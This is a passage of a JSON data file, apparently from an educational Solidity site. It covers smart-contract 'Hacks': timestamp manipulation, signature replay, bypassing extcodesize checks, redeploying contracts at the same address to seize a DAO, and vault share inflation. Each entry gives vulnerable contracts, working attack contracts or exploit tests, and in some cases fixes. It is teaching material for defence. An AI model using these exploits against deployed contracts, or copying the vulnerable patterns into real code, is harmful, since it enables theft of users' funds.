        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nRoulette is a game where you can win all of the Ether in the contract\nif you can submit a transaction at a specific timing.\nA player needs to send 10 Ether and wins if the block.timestamp % 15 == 0.\n*/\n\n/*\n1. Deploy Roulette with 10 Ether\n2. Eve runs a powerful miner that can manipulate the block timestamp.\n3. Eve sets the block.timestamp to a number in the future that is divisible by\n   15 and finds the target block hash.\n4. Eve's block is successfully included into the chain, Eve wins the\n   Roulette game.\n*/\n\ncontract Roulette {\n    uint256 public pastBlockTime;\n\n    constructor() payable {}\n\n    function spin() external payable {\n        require(msg.value == 10 ether); // must send 10 ether to play\n        require(block.timestamp != pastBlockTime); // only 1 transaction per block\n\n        pastBlockTime = block.timestamp;\n\n        if (block.timestamp % 15 == 0) {\n            (bool sent,) = msg.sender.call{value: address(this).balance}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "block",
      "timestamp",
      "manipulation"
    ],
    "order": 11
  },
  {
    "slug": "signature-replay",
    "title": "Signature Replay",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of a contract vulnerable to signature replay attack",
    "content": "Signing messages off-chain and having a contract that requires that signature before executing\na function is a useful technique.\n\nFor example this technique is used to:\n\n- reduce the number of transaction on chain\n- gas-less transaction, called `meta transaction`\n\n### Vulnerability\n\nSame signature can be used multiple times to execute a function. This can be harmful\nif the signer's intention was to approve a transaction once.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ECDSA.sol\";\n\ncontract MultiSigWallet {\n    using ECDSA for bytes32;\n\n    address[2] public owners;\n\n    constructor(address[2] memory _owners) payable {\n        owners = _owners;\n    }\n\n    function deposit() external payable {}\n\n    function transfer(address _to, uint256 _amount, bytes[2] memory _sigs)\n        external\n    {\n        bytes32 txHash = getTxHash(_to, _amount);\n        require(_checkSigs(_sigs, txHash), \"invalid sig\");\n\n        (bool sent,) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n\n    function getTxHash(address _to, uint256 _amount)\n        public\n        view\n        returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(_to, _amount));\n    }\n\n    function _checkSigs(bytes[2] memory _sigs, bytes32 _txHash)\n        private\n        view\n        returns (bool)\n    {\n        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();\n\n        for (uint256 i = 0; i < _sigs.length; i++) {\n            address signer = ethSignedHash.recover(_sigs[i]);\n            bool valid = signer == owners[i];\n\n            if (!valid) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n}\n\n```\n\n### Preventative Techniques\n\nSign messages with `nonce` and address of the contract.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ECDSA.sol\";\n\ncontract MultiSigWallet {\n    using ECDSA for bytes32;\n\n    address[2] public owners;\n    mapping(bytes32 => bool) public executed;\n\n    constructor(address[2] memory _owners) payable {\n        owners = _owners;\n    }\n\n    function deposit() external payable {}\n\n    function transfer(\n        address _to,\n        uint256 _amount,\n        uint256 _nonce,\n        bytes[2] memory _sigs\n    ) external {\n        bytes32 txHash = getTxHash(_to, _amount, _nonce);\n        require(!executed[txHash], \"tx executed\");\n        require(_checkSigs(_sigs, txHash), \"invalid sig\");\n\n        executed[txHash] = true;\n\n        (bool sent,) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n\n    function getTxHash(address _to, uint256 _amount, uint256 _nonce)\n        public\n        view\n        returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(address(this), _to, _amount, _nonce));\n    }\n\n    function _checkSigs(bytes[2] memory _sigs, bytes32 _txHash)\n        private\n        view\n        returns (bool)\n    {\n        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();\n\n        for (uint256 i = 0; i < _sigs.length; i++) {\n            address signer = ethSignedHash.recover(_sigs[i]);\n            bool valid = signer == owners[i];\n\n            if (!valid) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n}\n\n/*\n// owners\n0xe19aea93F6C1dBef6A3776848bE099A7c3253ac8\n0xfa854FE5339843b3e9Bfd8554B38BD042A42e340\n\n// to\n0xe10422cc61030C8B3dBCD36c7e7e8EC3B527E0Ac\n// amount\n100\n// nonce\n0\n// tx hash\n0x12a095462ebfca27dc4d99feef885bfe58344fb6bb42c3c52a7c0d6836d11448\n\n// signatures\n0x120f8ed8f2fa55498f2ef0a22f26e39b9b51ed29cc93fe0ef3ed1756f58fad0c6eb5a1d6f3671f8d5163639fdc40bb8720de6d8f2523077ad6d1138a60923b801c\n0xa240a487de1eb5bb971e920cb0677a47ddc6421e38f7b048f8aa88266b2c884a10455a52dc76a203a1a9a953418469f9eec2c59e87201bbc8db0e4d9796935cb1b\n*/\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/cryptography/ECDSA.sol)\n\nlibrary ECDSA {\n    enum RecoverError {\n        NoError,\n        InvalidSignature,\n        InvalidSignatureLength,\n        InvalidSignatureS,\n        InvalidSignatureV\n    }\n\n    function _throwError(RecoverError error) private pure {\n        if (error == RecoverError.NoError) {\n            return; // no error: do nothing\n        } else if (error == RecoverError.InvalidSignature) {\n            revert(\"ECDSA: invalid signature\");\n        } else if (error == RecoverError.InvalidSignatureLength) {\n            revert(\"ECDSA: invalid signature length\");\n        } else if (error == RecoverError.InvalidSignatureS) {\n            revert(\"ECDSA: invalid signature 's' value\");\n        } else if (error == RecoverError.InvalidSignatureV) {\n            revert(\"ECDSA: invalid signature 'v' value\");\n        }\n    }\n\n    function tryRecover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // Check the signature length\n        // - case 65: r,s,v signature (standard)\n        // - case 64: r,vs signature (cf https://eips.ethereum.org/EIPS/eip-2098) _Available since v4.1._\n        if (signature.length == 65) {\n            bytes32 r;\n            bytes32 s;\n            uint8 v;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                s := mload(add(signature, 0x40))\n                v := byte(0, mload(add(signature, 0x60)))\n            }\n            return tryRecover(hash, v, r, s);\n        } else if (signature.length == 64) {\n            bytes32 r;\n            bytes32 vs;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                vs := mload(add(signature, 0x40))\n            }\n            return tryRecover(hash, r, vs);\n        } else {\n            return (address(0), RecoverError.InvalidSignatureLength);\n        }\n    }\n\n    function recover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, signature);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        bytes32 s = vs\n            & bytes32(\n                0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n            );\n        uint8 v = uint8((uint256(vs) >> 255) + 27);\n        return tryRecover(hash, v, r, s);\n    }\n\n    function recover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, r, vs);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead of 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (\n            uint256(s)\n                > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0\n        ) {\n            return (address(0), RecoverError.InvalidSignatureS);\n        }\n        if (v != 27 && v != 28) {\n            return (address(0), RecoverError.InvalidSignatureV);\n        }\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(hash, v, r, s);\n        if (signer == address(0)) {\n            return (address(0), RecoverError.InvalidSignature);\n        }\n\n        return (signer, RecoverError.NoError);\n    }\n\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);\n        _throwError(error);\n        return recovered;\n    }\n\n    function toEthSignedMessageHash(bytes32 hash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        // 32 is the length in bytes of hash,\n        // enforced by the type signature above\n        return keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ECDSA.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/cryptography/ECDSA.sol)\n\nlibrary ECDSA {\n    enum RecoverError {\n        NoError,\n        InvalidSignature,\n        InvalidSignatureLength,\n        InvalidSignatureS,\n        InvalidSignatureV\n    }\n\n    function _throwError(RecoverError error) private pure {\n        if (error == RecoverError.NoError) {\n            return; // no error: do nothing\n        } else if (error == RecoverError.InvalidSignature) {\n            revert(\"ECDSA: invalid signature\");\n        } else if (error == RecoverError.InvalidSignatureLength) {\n            revert(\"ECDSA: invalid signature length\");\n        } else if (error == RecoverError.InvalidSignatureS) {\n            revert(\"ECDSA: invalid signature 's' value\");\n        } else if (error == RecoverError.InvalidSignatureV) {\n            revert(\"ECDSA: invalid signature 'v' value\");\n        }\n    }\n\n    function tryRecover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // Check the signature length\n        // - case 65: r,s,v signature (standard)\n        // - case 64: r,vs signature (cf https://eips.ethereum.org/EIPS/eip-2098) _Available since v4.1._\n        if (signature.length == 65) {\n            bytes32 r;\n            bytes32 s;\n            uint8 v;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                s := mload(add(signature, 0x40))\n                v := byte(0, mload(add(signature, 0x60)))\n            }\n            return tryRecover(hash, v, r, s);\n        } else if (signature.length == 64) {\n            bytes32 r;\n            bytes32 vs;\n            // ecrecover takes the signature parameters, and the only way to get them\n            // currently is to use assembly.\n            assembly {\n                r := mload(add(signature, 0x20))\n                vs := mload(add(signature, 0x40))\n            }\n            return tryRecover(hash, r, vs);\n        } else {\n            return (address(0), RecoverError.InvalidSignatureLength);\n        }\n    }\n\n    function recover(bytes32 hash, bytes memory signature)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, signature);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        bytes32 s = vs\n            & bytes32(\n                0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n            );\n        uint8 v = uint8((uint256(vs) >> 255) + 27);\n        return tryRecover(hash, v, r, s);\n    }\n\n    function recover(bytes32 hash, bytes32 r, bytes32 vs)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, r, vs);\n        _throwError(error);\n        return recovered;\n    }\n\n    function tryRecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address, RecoverError)\n    {\n        // EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature\n        // unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines\n        // the valid range for s in (301): 0 < s < secp256k1n ÷ 2 + 1, and for v in (302): v ∈ {27, 28}. Most\n        // signatures from current libraries generate a unique signature with an s-value in the lower half order.\n        //\n        // If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value\n        // with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or\n        // vice versa. If your library also generates signatures with 0/1 for v instead of 27/28, add 27 to v to accept\n        // these malleable signatures as well.\n        if (\n            uint256(s)\n                > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0\n        ) {\n            return (address(0), RecoverError.InvalidSignatureS);\n        }\n        if (v != 27 && v != 28) {\n            return (address(0), RecoverError.InvalidSignatureV);\n        }\n\n        // If the signature is valid (and not malleable), return the signer address\n        address signer = ecrecover(hash, v, r, s);\n        if (signer == address(0)) {\n            return (address(0), RecoverError.InvalidSignature);\n        }\n\n        return (signer, RecoverError.NoError);\n    }\n\n    function recover(bytes32 hash, uint8 v, bytes32 r, bytes32 s)\n        internal\n        pure\n        returns (address)\n    {\n        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);\n        _throwError(error);\n        return recovered;\n    }\n\n    function toEthSignedMessageHash(bytes32 hash)\n        internal\n        pure\n        returns (bytes32)\n    {\n        // 32 is the length in bytes of hash,\n        // enforced by the type signature above\n        return keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n    }\n}\n"
      },
      {
        "fileName": "PreventSigReplay.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ECDSA.sol\";\n\ncontract MultiSigWallet {\n    using ECDSA for bytes32;\n\n    address[2] public owners;\n    mapping(bytes32 => bool) public executed;\n\n    constructor(address[2] memory _owners) payable {\n        owners = _owners;\n    }\n\n    function deposit() external payable {}\n\n    function transfer(\n        address _to,\n        uint256 _amount,\n        uint256 _nonce,\n        bytes[2] memory _sigs\n    ) external {\n        bytes32 txHash = getTxHash(_to, _amount, _nonce);\n        require(!executed[txHash], \"tx executed\");\n        require(_checkSigs(_sigs, txHash), \"invalid sig\");\n\n        executed[txHash] = true;\n\n        (bool sent,) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n\n    function getTxHash(address _to, uint256 _amount, uint256 _nonce)\n        public\n        view\n        returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(address(this), _to, _amount, _nonce));\n    }\n\n    function _checkSigs(bytes[2] memory _sigs, bytes32 _txHash)\n        private\n        view\n        returns (bool)\n    {\n        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();\n\n        for (uint256 i = 0; i < _sigs.length; i++) {\n            address signer = ethSignedHash.recover(_sigs[i]);\n            bool valid = signer == owners[i];\n\n            if (!valid) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n}\n\n/*\n// owners\n0xe19aea93F6C1dBef6A3776848bE099A7c3253ac8\n0xfa854FE5339843b3e9Bfd8554B38BD042A42e340\n\n// to\n0xe10422cc61030C8B3dBCD36c7e7e8EC3B527E0Ac\n// amount\n100\n// nonce\n0\n// tx hash\n0x12a095462ebfca27dc4d99feef885bfe58344fb6bb42c3c52a7c0d6836d11448\n\n// signatures\n0x120f8ed8f2fa55498f2ef0a22f26e39b9b51ed29cc93fe0ef3ed1756f58fad0c6eb5a1d6f3671f8d5163639fdc40bb8720de6d8f2523077ad6d1138a60923b801c\n0xa240a487de1eb5bb971e920cb0677a47ddc6421e38f7b048f8aa88266b2c884a10455a52dc76a203a1a9a953418469f9eec2c59e87201bbc8db0e4d9796935cb1b\n*/\n"
      },
      {
        "fileName": "SigReplay.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ECDSA.sol\";\n\ncontract MultiSigWallet {\n    using ECDSA for bytes32;\n\n    address[2] public owners;\n\n    constructor(address[2] memory _owners) payable {\n        owners = _owners;\n    }\n\n    function deposit() external payable {}\n\n    function transfer(address _to, uint256 _amount, bytes[2] memory _sigs)\n        external\n    {\n        bytes32 txHash = getTxHash(_to, _amount);\n        require(_checkSigs(_sigs, txHash), \"invalid sig\");\n\n        (bool sent,) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n\n    function getTxHash(address _to, uint256 _amount)\n        public\n        view\n        returns (bytes32)\n    {\n        return keccak256(abi.encodePacked(_to, _amount));\n    }\n\n    function _checkSigs(bytes[2] memory _sigs, bytes32 _txHash)\n        private\n        view\n        returns (bool)\n    {\n        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();\n\n        for (uint256 i = 0; i < _sigs.length; i++) {\n            address signer = ethSignedHash.recover(_sigs[i]);\n            bool valid = signer == owners[i];\n\n            if (!valid) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "cryptography",
      "signature",
      "replay"
    ],
    "order": 12
  },
  {
    "slug": "contract-size",
    "title": "Bypass Contract Size Check",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of bypassing contract size check",
    "content": "### Vulnerability\n\nIf an address is a contract then the size of code stored at the address will be greater than 0 right?\n\nLet's see how we can create a contract with code size returned by `extcodesize` equal to 0.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Target {\n    function isContract(address account) public view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint256 size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n\ncontract FailedAttack {\n    // Attempting to call Target.protected will fail,\n    // Target block calls from contract\n    function pwn(address _target) external {\n        // This will fail\n        Target(_target).protected();\n    }\n}\n\ncontract Hack {\n    bool public isContract;\n    address public addr;\n\n    // When contract is being created, code size (extcodesize) is 0.\n    // This will bypass the isContract() check\n    constructor(address _target) {\n        isContract = Target(_target).isContract(address(this));\n        addr = address(this);\n        // This will work\n        Target(_target).protected();\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ContractSize.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Target {\n    function isContract(address account) public view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint256 size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n\ncontract FailedAttack {\n    // Attempting to call Target.protected will fail,\n    // Target block calls from contract\n    function pwn(address _target) external {\n        // This will fail\n        Target(_target).protected();\n    }\n}\n\ncontract Hack {\n    bool public isContract;\n    address public addr;\n\n    // When contract is being created, code size (extcodesize) is 0.\n    // This will bypass the isContract() check\n    constructor(address _target) {\n        isContract = Target(_target).isContract(address(this));\n        addr = address(this);\n        // This will work\n        Target(_target).protected();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "bypass",
      "contract",
      "size",
      "check",
      "extcodesize"
    ],
    "order": 13
  },
  {
    "slug": "deploy-different-contracts-same-address",
    "title": "Deploy Different Contracts at the Same Address",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of a Solidity contract vulnerable to deploy different contracts at the same address",
    "content": "Contract address deployed with `create` is computed in the following way.\n\n```\ncontract address = last 20 bytes of sha3(rlp_encode(sender, nonce))\n```\n\nwhere `sender` is the address of the deployer and `nonce` is the number of transactions sent by `sender`.\n\nHence it is possible to deploy different contracts at the same address if we can somehow reset the `nonce`.\n\nBelow is an example of how a DAO can be hacked.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nCalled by Alice\n0. Deploy DAO\n\nCalled by Attacker\n1. Deploy DeployerDeployer\n2. Call DeployerDeployer.deploy()\n3. Call Deployer.deployProposal()\n\nCalled by Alice\n4. Get DAO approval of Proposal\n\nCalled by Attacker\n5. Delete Proposal and Deployer\n6. Re-deploy Deployer\n7. Call Deployer.deployAttack()\n8. Call DAO.execute\n9. Check DAO.owner is attacker's address\n\nDAO -- approved --> Proposal\nDeployerDeployer -- create2 --> Deployer -- create --> Proposal\nDeployerDeployer -- create2 --> Deployer -- create --> Attack\n*/\n\ncontract DAO {\n    struct Proposal {\n        address target;\n        bool approved;\n        bool executed;\n    }\n\n    address public owner = msg.sender;\n    Proposal[] public proposals;\n\n    function approve(address target) external {\n        require(msg.sender == owner, \"not authorized\");\n\n        proposals.push(\n            Proposal({target: target, approved: true, executed: false})\n        );\n    }\n\n    function execute(uint256 proposalId) external payable {\n        Proposal storage proposal = proposals[proposalId];\n        require(proposal.approved, \"not approved\");\n        require(!proposal.executed, \"executed\");\n\n        proposal.executed = true;\n\n        (bool ok,) = proposal.target.delegatecall(\n            abi.encodeWithSignature(\"executeProposal()\")\n        );\n        require(ok, \"delegatecall failed\");\n    }\n}\n\ncontract Proposal {\n    event Log(string message);\n\n    function executeProposal() external {\n        emit Log(\"Executed code approved by DAO\");\n    }\n\n    function emergencyStop() external {\n        selfdestruct(payable(address(0)));\n    }\n}\n\ncontract Attack {\n    event Log(string message);\n\n    address public owner;\n\n    function executeProposal() external {\n        emit Log(\"Executed code not approved by DAO :)\");\n        // For example - set DAO's owner to attacker\n        owner = msg.sender;\n    }\n}\n\ncontract DeployerDeployer {\n    event Log(address addr);\n\n    function deploy() external {\n        bytes32 salt = keccak256(abi.encode(uint256(123)));\n        address addr = address(new Deployer{salt: salt}());\n        emit Log(addr);\n    }\n}\n\ncontract Deployer {\n    event Log(address addr);\n\n    function deployProposal() external {\n        address addr = address(new Proposal());\n        emit Log(addr);\n    }\n\n    function deployAttack() external {\n        address addr = address(new Attack());\n        emit Log(addr);\n    }\n\n    function kill() external {\n        selfdestruct(payable(address(0)));\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "TornadoHack.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\n/*\nCalled by Alice\n0. Deploy DAO\n\nCalled by Attacker\n1. Deploy DeployerDeployer\n2. Call DeployerDeployer.deploy()\n3. Call Deployer.deployProposal()\n\nCalled by Alice\n4. Get DAO approval of Proposal\n\nCalled by Attacker\n5. Delete Proposal and Deployer\n6. Re-deploy Deployer\n7. Call Deployer.deployAttack()\n8. Call DAO.execute\n9. Check DAO.owner is attacker's address\n\nDAO -- approved --> Proposal\nDeployerDeployer -- create2 --> Deployer -- create --> Proposal\nDeployerDeployer -- create2 --> Deployer -- create --> Attack\n*/\n\ncontract DAO {\n    struct Proposal {\n        address target;\n        bool approved;\n        bool executed;\n    }\n\n    address public owner = msg.sender;\n    Proposal[] public proposals;\n\n    function approve(address target) external {\n        require(msg.sender == owner, \"not authorized\");\n\n        proposals.push(\n            Proposal({target: target, approved: true, executed: false})\n        );\n    }\n\n    function execute(uint256 proposalId) external payable {\n        Proposal storage proposal = proposals[proposalId];\n        require(proposal.approved, \"not approved\");\n        require(!proposal.executed, \"executed\");\n\n        proposal.executed = true;\n\n        (bool ok,) = proposal.target.delegatecall(\n            abi.encodeWithSignature(\"executeProposal()\")\n        );\n        require(ok, \"delegatecall failed\");\n    }\n}\n\ncontract Proposal {\n    event Log(string message);\n\n    function executeProposal() external {\n        emit Log(\"Executed code approved by DAO\");\n    }\n\n    function emergencyStop() external {\n        selfdestruct(payable(address(0)));\n    }\n}\n\ncontract Attack {\n    event Log(string message);\n\n    address public owner;\n\n    function executeProposal() external {\n        emit Log(\"Executed code not approved by DAO :)\");\n        // For example - set DAO's owner to attacker\n        owner = msg.sender;\n    }\n}\n\ncontract DeployerDeployer {\n    event Log(address addr);\n\n    function deploy() external {\n        bytes32 salt = keccak256(abi.encode(uint256(123)));\n        address addr = address(new Deployer{salt: salt}());\n        emit Log(addr);\n    }\n}\n\ncontract Deployer {\n    event Log(address addr);\n\n    function deployProposal() external {\n        address addr = address(new Proposal());\n        emit Log(addr);\n    }\n\n    function deployAttack() external {\n        address addr = address(new Attack());\n        emit Log(addr);\n    }\n\n    function kill() external {\n        selfdestruct(payable(address(0)));\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "deploy",
      "salt",
      "create",
      "create2",
      "different",
      "contract",
      "same",
      "address"
    ],
    "order": 14
  },
  {
    "slug": "vault-inflation",
    "title": "Vault Inflation",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of vault inflation",
    "content": "### Vulnerability\n\nVault shares can be inflated by donating ERC20 token to the vault.\n\nAttacker can exploit this behavior to steal other user's deposits.\n\n### Example\n\nUser 0 front runs user 1's deposit.\n\n1. User 0 deposits `1`.\n2. User 0 donates `100 * 1e18`. This inflates the value of each share.\n3. User 1 deposits `100 * 1e18`. This mints 0 shares to user 1.\n4. User 0 withdraws all `200 * 1e18 + 1`.\n\n### Protections\n\n- Min shares -> protects from front running\n- Internal balance -> protects from donation\n- Dead shares -> contract is first depositor\n- Decimal offset (OpenZeppelin ERC4626)\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {\n    IERC20,\n    Vault,\n    Token\n} from \"../../../src/hacks/vault-inflation/VaultInflation.sol\";\n\nuint8 constant DECIMALS = 18;\n\ncontract VaultTest is Test {\n    Vault private vault;\n    Token private token;\n\n    address[] private users = [address(11), address(12)];\n\n    function setUp() public {\n        token = new Token();\n        vault = new Vault(address(token));\n\n        for (uint256 i = 0; i < users.length; i++) {\n            token.mint(users[i], 10000 * (10 ** DECIMALS));\n            vm.prank(users[i]);\n            token.approve(address(vault), type(uint256).max);\n        }\n    }\n\n    function print() private {\n        console2.log(\"vault total supply\", vault.totalSupply());\n        console2.log(\"vault balance\", token.balanceOf(address(vault)));\n        uint256 shares0 = vault.balanceOf(users[0]);\n        uint256 shares1 = vault.balanceOf(users[1]);\n        console2.log(\"users[0] shares\", shares0);\n        console2.log(\"users[1] shares\", shares1);\n        console2.log(\"users[0] redeemable\", vault.previewRedeem(shares0));\n        console2.log(\"users[1] redeemable\", vault.previewRedeem(shares1));\n    }\n\n    function test() public {\n        // users[0] deposit 1\n        console2.log(\"--- users[0] deposit ---\");\n        vm.prank(users[0]);\n        vault.deposit(1);\n        print();\n\n        // users[0] donate 100\n        console2.log(\"--- users[0] donate ---\");\n        vm.prank(users[0]);\n        token.transfer(address(vault), 100 * (10 ** DECIMALS));\n        print();\n\n        // users[1] deposit 100\n        console2.log(\"--- users[1] deposit ---\");\n        vm.prank(users[1]);\n        vault.deposit(100 * (10 ** DECIMALS));\n        print();\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "VaultInflation.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {\n    IERC20,\n    Vault,\n    Token\n} from \"../../../src/hacks/vault-inflation/VaultInflation.sol\";\n\nuint8 constant DECIMALS = 18;\n\ncontract VaultTest is Test {\n    Vault private vault;\n    Token private token;\n\n    address[] private users = [address(11), address(12)];\n\n    function setUp() public {\n        token = new Token();\n        vault = new Vault(address(token));\n\n        for (uint256 i = 0; i < users.length; i++) {\n            token.mint(users[i], 10000 * (10 ** DECIMALS));\n            vm.prank(users[i]);\n            token.approve(address(vault), type(uint256).max);\n        }\n    }\n\n    function print() private {\n        console2.log(\"vault total supply\", vault.totalSupply());\n        console2.log(\"vault balance\", token.balanceOf(address(vault)));\n        uint256 shares0 = vault.balanceOf(users[0]);\n        uint256 shares1 = vault.balanceOf(users[1]);\n        console2.log(\"users[0] shares\", shares0);\n        console2.log(\"users[1] shares\", shares1);\n        console2.log(\"users[0] redeemable\", vault.previewRedeem(shares0));\n        console2.log(\"users[1] redeemable\", vault.previewRedeem(shares1));\n    }\n\n    function test() public {\n        // users[0] deposit 1\n        console2.log(\"--- users[0] deposit ---\");\n        vm.prank(users[0]);\n        vault.deposit(1);\n        print();\n\n        // users[0] donate 100\n        console2.log(\"--- users[0] donate ---\");\n        vm.prank(users[0]);\n        token.transfer(address(vault), 100 * (10 ** DECIMALS));\n        print();\n\n        // users[1] deposit 100\n        console2.log(\"--- users[1] deposit ---\");\n        vm.prank(users[1]);\n        vault.deposit(100 * (10 ** DECIMALS));\n        print();\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "hack",
      "security",
      "inflation",
      "erc4626",
      "vault"
    ],
    "order": 15
  },
  {
    "slug": "weth-permit",
    "title": "WETH Permit",
    "category": "Hacks",
    "categorySlug": "hacks",
    "description": "An example of WETH permit hack",
